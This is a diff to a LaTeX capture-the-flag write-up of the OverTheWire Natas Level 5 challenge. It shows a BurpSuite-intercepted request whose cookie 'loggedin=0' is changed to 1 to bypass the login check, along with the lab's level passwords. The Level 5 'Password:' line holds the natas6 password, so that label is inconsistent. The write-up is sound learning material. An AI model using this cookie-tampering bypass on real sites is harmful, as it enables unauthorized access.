@@ -153,15 +153,36 @@ Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
 \end{verbatim}
 
 \subsection*{Level 5}
-Password: 
+Password: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
+
+The login is from \href{http://natas5.natas.labs.overthewire.org}{http://natas5.natas.labs.overthewire.org}. I logged in with the previously found credentials. 
+
+I again opened up BurpSuite, which allowed me to intercept all traffic going in and out using a proxy. This meant that when sending a page, I can edit the contents before sending it out. In this case, when I logged in, I was greeted with a message that I was not logged in. This did not make any sense, as I just used the correct credentials. I refreshed the page and looked at the contents of the request. This is what I found (note the attribute at the bottom that says \verb|loggedin|)
 
 \begin{verbatim}
+GET / HTTP/1.1
+Host: natas5.natas.labs.overthewire.org
+Cache-Control: max-age=0
+Authorization: Basic bmF0YXM1OjBuMzVQa2dnQVBtMnpiRXBPVTgwMmMweDBNc24xVG9L
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Cookie: loggedin=0
+Connection: keep-alive
 \end{verbatim}
 
+I changed the \verb|Cookie: loggedin=0| to \verb|Cookie: loggedin=1|, and forwarded the request. The new password page with the credentials are now shown. In response to this.
+
+\begin{verbatim}
+Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
+\end{verbatim}
 
 
 \subsection*{Level 6}
 Password: 
+
 
 \subsection*{Level 7}
 Password: 
